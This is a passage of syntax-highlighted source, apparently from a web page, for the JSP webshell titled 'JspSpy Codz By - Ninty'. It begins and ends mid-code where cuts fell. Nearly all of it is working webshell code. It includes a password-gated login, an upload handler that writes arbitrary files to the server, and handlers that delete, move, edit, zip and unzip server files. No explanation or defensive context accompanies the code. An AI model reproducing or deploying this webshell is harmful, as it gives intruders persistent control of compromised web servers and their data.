class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> static void outMsg(Writer out,<span class="built_in">String</span> msg) throws Exception &#123;</span></span><br><span class="line"><span class="vbscript">outMsg(out,msg,<span class="string">"center"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> static void outMsg(Writer out,<span class="built_in">String</span> msg,<span class="built_in">String</span> align) throws Exception &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (msg.indexOf(<span class="string">"java.lang.ClassNotFoundException"</span>) != <span class="number">-1</span>)</span></span><br><span class="line"><span class="vbscript">msg = <span class="string">"Can Not Find The Driver!&lt;br/&gt;"</span> + msg;</span></span><br><span class="line"><span class="vbscript">out.write(<span class="string">"&lt;div style=\"</span>background:#f1f1f1;border:<span class="number">1</span>px solid #ddd;padding:<span class="number">15</span>px;font:<span class="number">14</span>px;text-align:<span class="string">"+align+"</span>;font-weight:bold;margin:<span class="number">10</span>px\<span class="string">"&gt;"</span>+msg+<span class="string">"&lt;/div&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> UploadBean &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> <span class="built_in">String</span> fileName = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> <span class="built_in">String</span> suffix = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> <span class="built_in">String</span> savePath = <span class="string">""</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> ServletInputStream sis = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> byte[] b = <span class="keyword">new</span> byte[<span class="number">1024</span>];</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> UploadBean() &#123;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void setSavePath(<span class="built_in">String</span> path) &#123;</span></span><br><span class="line"><span class="vbscript">this.savePath = path;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void parseRequest(HttpServletRequest <span class="built_in">request</span>) throws IOException &#123;</span></span><br><span class="line"><span class="vbscript">sis = <span class="built_in">request</span>.getInputStream();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> a = <span class="number">0</span>;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> k = <span class="number">0</span>;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> s = <span class="string">""</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span> ((a = sis.readLine(b,<span class="number">0</span>,b.length))!= <span class="number">-1</span>) &#123;</span></span><br><span class="line"><span class="vbscript">s = <span class="keyword">new</span> <span class="built_in">String</span>(b, <span class="number">0</span>, a,PAGE_CHARSET);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> ((k = s.indexOf(<span class="string">"filename=\""))!= -1) &#123;</span></span></span><br><span class="line"><span class="vbscript">s = s.substring(k + <span class="number">10</span>);</span></span><br><span class="line"><span class="vbscript">k = s.indexOf(<span class="string">"\"");</span></span></span><br><span class="line"><span class="vbscript">s = s.substring(<span class="number">0</span>, k);</span></span><br><span class="line"><span class="vbscript">File tF = <span class="keyword">new</span> File(s);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (tF.isAbsolute()) &#123;</span></span><br><span class="line"><span class="vbscript">fileName = tF.getName();</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">fileName = s;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">k = s.lastIndexOf(<span class="string">"."</span>);</span></span><br><span class="line"><span class="vbscript">suffix = s.substring(k + <span class="number">1</span>);</span></span><br><span class="line"><span class="vbscript">upload();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> void upload() &#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">FileOutputStream out = <span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(savePath,fileName));</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> a = <span class="number">0</span>;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> k = <span class="number">0</span>;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> s = <span class="string">""</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span> ((a = sis.readLine(b,<span class="number">0</span>,b.length))!=<span class="number">-1</span>) &#123;</span></span><br><span class="line"><span class="vbscript">s = <span class="keyword">new</span> <span class="built_in">String</span>(b, <span class="number">0</span>, a);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> ((k = s.indexOf(<span class="string">"Content-Type:"</span>))!=<span class="number">-1</span>) &#123;</span></span><br><span class="line"><span class="vbscript">break;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">sis.readLine(b,<span class="number">0</span>,b.length);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span> ((a = sis.readLine(b,<span class="number">0</span>,b.length)) != <span class="number">-1</span>) &#123;</span></span><br><span class="line"><span class="vbscript">s = <span class="keyword">new</span> <span class="built_in">String</span>(b, <span class="number">0</span>, a);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> ((b[<span class="number">0</span>] == <span class="number">45</span>) &amp;&amp; (b[<span class="number">1</span>] == <span class="number">45</span>) &amp;&amp; (b[<span class="number">2</span>] == <span class="number">45</span>) &amp;&amp; (b[<span class="number">3</span>] == <span class="number">45</span>) &amp;&amp; (b[<span class="number">4</span>] == <span class="number">45</span>)) &#123;</span></span><br><span class="line"><span class="vbscript">break;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">out.write(b, <span class="number">0</span>, a);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">out.close();</span></span><br><span class="line"><span class="vbscript">&#125; catch (IOException ioe) &#123;</span></span><br><span class="line"><span class="vbscript">ioe.printStackTrace();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%</span></span><br><span class="line"><span class="vbscript">SHELL_NAME = <span class="built_in">request</span>.getServletPath().substring(<span class="built_in">request</span>.getServletPath().lastIndexOf(<span class="string">"/"</span>)+<span class="number">1</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> myAbsolutePath = application.getRealPath(<span class="built_in">request</span>.getServletPath());</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(myAbsolutePath)) &#123;//<span class="keyword">for</span> weblogic</span></span><br><span class="line"><span class="vbscript">SHELL_NAME = <span class="built_in">request</span>.getServletPath();</span></span><br><span class="line"><span class="vbscript">myAbsolutePath = <span class="keyword">new</span> File(application.getResource(<span class="string">"/"</span>).getPath()+SHELL_NAME).toString();</span></span><br><span class="line"><span class="vbscript">SHELL_NAME=<span class="built_in">request</span>.getContextPath()+SHELL_NAME;</span></span><br><span class="line"><span class="vbscript">WEB_ROOT = <span class="keyword">new</span> File(application.getResource(<span class="string">"/"</span>).getPath()).toString();</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">WEB_ROOT = application.getRealPath(<span class="string">"/"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">SHELL_DIR = Util.convertPath(myAbsolutePath.substring(<span class="number">0</span>,myAbsolutePath.lastIndexOf(File.separator)));</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (session.getAttribute(CURRENT_DIR) == <span class="literal">null</span>)</span></span><br><span class="line"><span class="vbscript">session.setAttribute(CURRENT_DIR,Util.convertPath(SHELL_DIR));</span></span><br><span class="line"><span class="vbscript"><span class="built_in">request</span> = <span class="keyword">new</span> MyRequest(<span class="built_in">request</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (session.getAttribute(PW_SESSION_ATTRIBUTE) == <span class="literal">null</span> || !(session.getAttribute(PW_SESSION_ATTRIBUTE)).equals(PW)) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> o = <span class="built_in">request</span>.getParameter(<span class="string">"o"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (o != <span class="literal">null</span> &amp;&amp;  o.equals(<span class="string">"login"</span>)) &#123;</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"login"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,session);</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (o != <span class="literal">null</span> &amp;&amp; o.equals(<span class="string">"vLogin"</span>)) &#123;</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"vLogin"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,session);</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=vLogin"</span>);</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%!</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static interface Invoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> DefaultInvoker implements Invoker&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception &#123;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;</span></span><br><span class="line"><span class="vbscript">return <span class="literal">true</span>;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter() &#123;</span></span><br><span class="line"><span class="vbscript">return <span class="literal">true</span>;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> ScriptInvoker extends DefaultInvoker&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;script type=\"</span>text/javascript\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	String.prototype.trim = function()&#123;return this.replace(/^\\s+|\\s+$/,'');&#125;;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	function fso(obj) &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		this.currentDir = '"</span>+JSession.getAttribute(CURRENT_DIR)+<span class="string">"';"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		this.filename = obj.filename;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		this.path = obj.path;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		this.filetype = obj.filetype;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	&#125;;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	fso.prototype = &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		copy:function()&#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var path = prompt('Copy To : ',this.path);"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			if (path == null || path.trim().length == 0 || path.trim() == this.path)return;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			doPost(&#123;o:'copy',src:this.path,to:path&#125;);"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;,"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		move:function() &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var path =prompt('Move To : ',this.path);"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			if (path == null || path.trim().length == 0 || path.trim() == this.path)return;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			doPost(&#123;o:'move',src:this.path,to:path&#125;)"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;,"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		vEdit:function() &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			doPost(&#123;o:'vEdit',filepath:this.path&#125;)"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;,"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		down:function() &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			doPost(&#123;o:'down',path:this.path&#125;)"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;,"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		removedir:function() &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			if (!confirm('Dangerous ! Are You Sure To Delete '+this.filename+'?'))return;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			doPost(&#123;o:'removedir',dir:this.path&#125;);"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;,"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		mkdir:function() &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var name = prompt('Input New Directory Name','');"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			if (name == null || name.trim().length == 0)return;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			doPost(&#123;o:'mkdir',name:name&#125;);"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;,"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		subdir:function() &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			doPost(&#123;o:'filelist',folder:this.path&#125;)"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;,"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		parent:function() &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var parent=(this.path.substr(0,this.path.lastIndexOf(\"</span>/\<span class="string">")))+'/';"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			doPost(&#123;o:'filelist',folder:parent&#125;)"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;,"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		createFile:function() &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var path = prompt('Input New File Name','');"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			if (path == null || path.trim().length == 0) return;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			doPost(&#123;o:'vCreateFile',filepath:path&#125;)"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;,"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		deleteBatch:function() &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			if (!confirm('Are You Sure To Delete These Files?')) return;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var selected = new Array();"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var inputs = document.getElementsByTagName('input');"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			for (var i = 0;i&lt;inputs.length;i++)&#123;if(inputs[i].checked)&#123;selected.push(inputs[i].value)&#125;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			if (selected.length == 0) &#123;alert('No File Selected');return;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			doPost(&#123;o:'deleteBatch',files:selected.join(',')&#125;)"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;,"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		packBatch:function() &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var selected = new Array();"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var inputs = document.getElementsByTagName('input');"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			for (var i = 0;i&lt;inputs.length;i++)&#123;if(inputs[i].checked)&#123;selected.push(inputs[i].value)&#125;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			if (selected.length == 0) &#123;alert('No File Selected');return;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var savefilename = prompt('Input Target File Name(Only Support ZIP)','pack.zip');"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			if (savefilename == null || savefilename.trim().length == 0)return;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			doPost(&#123;o:'packBatch',files:selected.join(','),savefilename:savefilename&#125;)"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;,"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		pack:function() &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var tmpName = '';"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			if (this.filename.indexOf('.') == -1) tmpName = this.filename;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			else tmpName = this.filename.substr(0,this.filename.lastIndexOf('.'));"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			tmpName += '.zip';"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var path = this.path;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var name = prompt('Input Target File Name (Only Support Zip)',tmpName);"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			if (name == null || path.trim().length == 0) return;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			doPost(&#123;o:'pack',packedfile:path,savefilename:name&#125;)"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;,"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		vEditProperty:function() &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var path = this.path;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			doPost(&#123;o:'vEditProperty',filepath:path&#125;)"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;,"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		unpack:function() &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var path = prompt('unpack to : ',this.currentDir+'/'+this.filename.substr(0,this.filename.lastIndexOf('.')));"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			if (path == null || path.trim().length == 0) return;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			doPost(&#123;o:'unpack',savepath:path,zipfile:this.path&#125;)"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	&#125;;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	function doPost(obj) &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		var form = document.forms[\"</span>doForm\<span class="string">"];"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		var elements = form.elements;for (var i = form.length - 1;i&gt;=0;i--)&#123;form.removeChild(elements[i])&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		for (var pro in obj)"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var input = document.createElement(\"</span>input\<span class="string">");"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			input.type = \"</span>hidden\<span class="string">";"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			input.name = pro;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			input.value = obj[pro];"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			form.appendChild(input);"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		form.submit();"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/script&gt;"</span>);	</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> BeforeInvoker extends  DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;html&gt;&lt;head&gt;&lt;title&gt;JspSpy Codz By - Ninty&lt;/title&gt;&lt;style type=\"</span>text/css\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"body,td&#123;font: 12px Arial,Tahoma;line-height: 16px;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">".input&#123;font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">".area&#123;font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">".bt &#123;border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"a &#123;color: #00f;text-decoration:underline;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"a:hover&#123;color: #f00;text-decoration:none;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">".alt1 td&#123;border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 10px 5px 5px;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">".alt2 td&#123;border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 10px 5px 5px;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">".focus td&#123;border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 10px 5px 5px;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">".head td&#123;border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 10px 5px 5px;font-weight:bold;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">".head td span&#123;font-weight:normal;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"form&#123;margin:0;padding:0;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"h2&#123;margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"ul.info li&#123;margin:0;color:#444;line-height:24px;height:24px;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"u&#123;text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">".secho&#123;height:400px;width:100%;overflow:auto;border:none&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/style&gt;&lt;/head&gt;&lt;body style=\"</span>margin:<span class="number">0</span>;table-layout:fixed; word-break:break-all\<span class="string">"&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> AfterInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;/body&gt;&lt;/html&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> DeleteBatchInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> files = <span class="built_in">request</span>.getParameter(<span class="string">"files"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!Util.<span class="built_in">isEmpty</span>(files)) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> currentDir = JSession.getAttribute(CURRENT_DIR).toString();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span>[] arr = files.<span class="built_in">split</span>(<span class="string">","</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">for</span> (<span class="built_in">String</span> fs:arr) &#123;</span></span><br><span class="line"><span class="vbscript">File f = <span class="keyword">new</span> File(currentDir,fs);</span></span><br><span class="line"><span class="vbscript">f.delete();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(MSG,<span class="string">"Delete Files Success!"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=index"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> ClipBoardInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">15</span>\<span class="string">" cellspacing=\"</span><span 